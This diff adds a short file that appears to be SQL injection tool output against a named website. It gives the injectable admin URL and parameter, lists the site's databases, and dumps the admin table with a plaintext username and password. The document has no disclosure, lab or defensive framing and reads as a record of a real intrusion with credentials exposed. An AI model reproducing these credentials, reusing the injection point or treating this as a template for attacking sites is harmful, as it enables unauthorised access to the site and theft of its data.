@@ -1,0 +1,14 @@
+VULN URL : https://www.rokofis.net/Admin/Profil/zimmetyazdir.php?PersonelID=1
+
+available databases [2]:
+[*] information_schema
+[*] rokofis1_Rokdb
+
+Database: rokofis1_Rokdb
+Table: rok_admin
+[1 entry]
++----+--------------+---------------+
+| id | sifre        | kullanici_adi |
++----+--------------+---------------+
+| 5  | rokofis12345 | admin         |
++----+--------------+---------------+
